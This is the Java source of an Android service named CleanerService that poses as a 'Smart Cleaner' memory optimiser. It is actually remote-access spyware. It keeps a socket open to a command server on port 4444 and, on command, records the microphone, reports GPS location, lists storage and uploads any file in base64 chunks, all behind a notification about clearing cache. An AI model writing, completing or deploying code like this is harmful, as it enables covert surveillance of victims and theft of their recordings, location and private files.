package com.smartclean.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CleanerService extends Service {
    private String SERVER_IP = "192.168.1.6"; // حط IP الكمبيوتر بتاعك هنا
    private int SERVER_PORT = 4444;
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean running = true;
    
    private MediaRecorder recorder;
    private boolean isRecording = false;
    private File currentAudioFile;

    @Override
    public void onCreate() {
        super.onCreate();
        String channelId = "smart_cleaner_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Smart Cleaner", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification notif = new Notification.Builder(this, channelId)
                .setContentTitle("Smart Cleaner")
                .setContentText("Optimizing memory and clearing cache...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(1, notif);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (running) {
                try {
                    socket = new Socket(SERVER_IP, SERVER_PORT);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    out.println("{\"event\":\"connected\",\"model\":\"" + Build.MODEL + "\"}");
                    String line;
                    while ((line = in.readLine()) != null) {
                        handleCommand(new JSONObject(line));
                    }
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (Exception ignored) {}
                }
            }
        }).start();
        return START_STICKY;
    }

    private void handleCommand(JSONObject cmd) {
        new Thread(() -> {
            try {
                String action = cmd.getString("cmd");
                switch (action) {
                    case "start_rec":
                        startRecording();
                        break;
                    case "stop_rec":
                        stopRecording();
                        break;
                    case "loc":
                        getLocation();
                        break;
                    case "files":
                        listFiles(cmd.optString("path", "/storage/emulated/0/"));
                        break;
                    case "getfile":
                        sendFile(cmd.getString("path"));
                        break;
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void startRecording() {
        if (isRecording) return;
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentAudioFile = new File(getCacheDir(), "rec_" + timeStamp + ".mp4");
            
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(currentAudioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            isRecording = true;
            sendResponse("{\"event\":\"status\",\"msg\":\"Recording started\"}");
        } catch (Exception e) {
            sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
        }
    }

    private void stopRecording() {
        if (!isRecording || recorder == null) return;
        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;
            sendResponse("{\"event\":\"status\",\"msg\":\"Recording stopped. Sending file...\"}");
            if (currentAudioFile != null && currentAudioFile.exists()) {
                sendFile(currentAudioFile.getAbsolutePath());
                currentAudioFile.delete();
            }
        } catch (Exception e) {
            sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
        }
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendResponse("{\"event\":\"location\",\"lat\":" + loc.getLatitude() + ",\"lon\":" + loc.getLongitude() + "}");
            } else {
                sendResponse("{\"event\":\"error\",\"msg\":\"No location\"}");
            }
        } catch (SecurityException e) {
            sendResponse("{\"event\":\"error\",\"msg\":\"No permission\"}");
        }
    }

    private void listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                sendResponse("{\"event\":\"error\",\"msg\":\"Invalid path\"}");
                return;
            }
            File[] files = dir.listFiles();
            JSONArray arr = new JSONArray();
            if (files != null) {
                for (File f : files) {
                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("isDir", f.isDirectory());
                    obj.put("size", f.length());
                    obj.put("path", f.getAbsolutePath());
                    arr.put(obj);
                }
            }
            sendResponse("{\"event\":\"files\",\"path\":\"" + path + "\",\"data\":" + arr.toString() + "}");
        } catch (Exception e) {
            sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
        }
    }

    private void sendFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || f.isDirectory()) return;
            byte[] bytes = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(bytes);
            fis.close();
            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            int chunkSize = 500000;
            for (int i = 0; i < b64.length(); i += chunkSize) {
                int end = Math.min(b64.length(), i + chunkSize);
                String chunk = b64.substring(i, end);
                JSONObject obj = new JSONObject();
                obj.put("event", "file_chunk");
                obj.put("name", f.getName());
                obj.put("chunk", chunk);
                obj.put("eof", end == b64.length());
                sendResponse(obj.toString());
            }
        } catch (Exception e) {
            sendResponse("{\"event\":\"error\",\"msg\":\"" + e.getMessage() + "\"}");
        }
    }

    private void sendResponse(String msg) {
        if (out != null) out.println(msg);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (recorder != null) { recorder.release(); recorder = null; }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
